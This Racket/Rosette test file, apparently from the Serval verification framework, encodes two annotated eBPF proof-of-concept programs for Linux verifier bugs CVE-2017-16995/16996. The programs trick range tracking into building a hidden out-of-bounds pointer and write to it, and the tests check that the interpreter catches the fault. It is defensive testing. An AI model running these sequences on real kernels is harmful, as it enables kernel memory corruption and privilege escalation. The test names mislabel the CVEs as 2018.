#lang rosette

; https://bugs.chromium.org/p/project-zero/issues/detail?id=1454
; CVE-2017-16995
; CVE-2017-16996

(require
  rackunit
  rackunit/text-ui
  rosette/lib/roseunit
  serval/bpf
  serval/lib/unittest)

(define mapfd 1)

(define insns1 (make-insns
  (BPF_LD_MAP_FD BPF_REG_ARG1 mapfd)

  ; fill r0 with pointer to map value
  (BPF_MOV64_REG BPF_REG_TMP BPF_REG_FP)
  (BPF_ALU64_IMM BPF_ADD BPF_REG_TMP -4) ; allocate 4 bytes stack
  (BPF_MOV32_IMM BPF_REG_ARG2 1)
  (BPF_STX_MEM BPF_W BPF_REG_TMP BPF_REG_ARG2 0)
  (BPF_MOV64_REG BPF_REG_ARG2 BPF_REG_TMP)
  (BPF_EMIT_CALL BPF_FUNC_map_lookup_elem)
  (BPF_JMP_IMM BPF_JNE BPF_REG_0 0 2)
  (BPF_MOV64_REG BPF_REG_0 0) ; prepare exit
  (BPF_EXIT_INSN) ; exit

  ; r1 = 0xffff'ffff mistreated as 0xffff'ffff'ffff'ffff
  (BPF_MOV32_IMM BPF_REG_1 #xffffffff)
  ; r1 = 0x1'0000'0000 mistreated as 0
  (BPF_ALU64_IMM BPF_ADD BPF_REG_1 1)
  ; r1 = 0x1000'0000'0000'0000 mistreated as 0
  (BPF_ALU64_IMM BPF_LSH BPF_REG_1 28)

  ; compute noncanonical pointer
  (BPF_ALU64_REG BPF_ADD BPF_REG_0 BPF_REG_1)

  ; crash by writing to noncanonical pointer
  (BPF_MOV32_IMM BPF_REG_1 #xdeadbeef)
  (BPF_STX_MEM BPF_W BPF_REG_0 BPF_REG_1 0)

  ; terminate to make the verifier happy
  (BPF_MOV32_IMM BPF_REG_0 0)
  (BPF_EXIT_INSN)))

(define (check-poc1)
  (define fdtable (vector #f (make-array-map 8 16)))
  (define cpu (init-cpu #f fdtable))
  (check-exn exn:fail? (lambda () (with-asserts (interpret-program cpu insns1))))
  (check-equal? current-pc-debug 16))


(define insns2 (make-insns
  (BPF_LD_MAP_FD BPF_REG_ARG1 mapfd)

  ; fill r3 with value in range [0x0 0xf] actually 0x8:
  ; first load map value pointer...
  (BPF_MOV64_REG BPF_REG_TMP BPF_REG_FP) 
  (BPF_ALU64_IMM BPF_ADD BPF_REG_TMP -4) ; allocate 4 bytes stack
  (BPF_MOV32_IMM BPF_REG_ARG2 1)
  (BPF_STX_MEM BPF_W BPF_REG_TMP BPF_REG_ARG2 0)
  (BPF_MOV64_REG BPF_REG_ARG2 BPF_REG_TMP)
  (BPF_EMIT_CALL BPF_FUNC_map_lookup_elem)
  (BPF_JMP_IMM BPF_JNE BPF_REG_0 0 2)
  (BPF_MOV64_REG BPF_REG_0 0) ; prepare exit
  (BPF_EXIT_INSN) ; exit

  ; ... then write read mask map value
  ; (tracing actual values through a map is impossible)
  (BPF_MOV32_IMM BPF_REG_3 8)
  (BPF_STX_MEM BPF_W BPF_REG_0 BPF_REG_3 0) 
  (BPF_LDX_MEM BPF_W BPF_REG_3 BPF_REG_0 0) 
  (BPF_ALU64_IMM BPF_AND BPF_REG_3 #xf)

  ; load r1=0xffff'fff8 while working around the first verifier bug
  (BPF_MOV32_IMM BPF_REG_1 (arithmetic-shift #xfffffff8 -1))
  (BPF_ALU64_REG BPF_ADD BPF_REG_1 BPF_REG_1)

  ; r1 in range [0xffff'fff8 0x1'0000'0007]
  (BPF_ALU64_REG BPF_ADD BPF_REG_1 BPF_REG_3)

  ; load r2=0
  (BPF_MOV32_IMM BPF_REG_2 0)

  ; trigger verifier bug:
  ; visible range: [0xffff'fff8 0xffff'ffff]
  ; hidden range: [0 7]
  ; actual value: 0
  (BPF_ALU32_REG BPF_ADD BPF_REG_1 BPF_REG_2)

  ; collapse down: verifier sees 1 actual value 0
  (BPF_ALU64_IMM BPF_RSH BPF_REG_1 31)

  ; flip: verifier sees 0 actual value 1
  (BPF_ALU64_IMM BPF_SUB BPF_REG_1 1)
  (BPF_ALU64_IMM BPF_MUL BPF_REG_1 -1)

  ; r1 = 0x1000'0000'0000'0000 verifier sees 0
  (BPF_ALU64_IMM BPF_LSH BPF_REG_1 60)

  ; compute noncanonical pointer
  (BPF_ALU64_REG BPF_ADD BPF_REG_0 BPF_REG_1)

  ; crash by writing to noncanonical pointer
  (BPF_MOV32_IMM BPF_REG_1 #xdeadbeef)
  (BPF_STX_MEM BPF_W BPF_REG_0 BPF_REG_1 0)

  ; terminate to make the verifier happy
  (BPF_MOV32_IMM BPF_REG_0 0)
  (BPF_EXIT_INSN)))

(define (check-poc2)
  (define fdtable (vector #f (make-array-map 8 16)))
  (define cpu (init-cpu #f fdtable))
  (check-exn exn:fail? (lambda () (with-asserts (interpret-program cpu insns2))))
  (check-equal? current-pc-debug 26))


(define bpf-tests
  (test-suite+ "Tests for PoC (Project Zero 1454)"
    (test-case+ "CVE-2018-16995" (check-poc1))
    (test-case+ "CVE-2018-16996" (check-poc2))))

(module+ test
  (time (run-tests bpf-tests)))

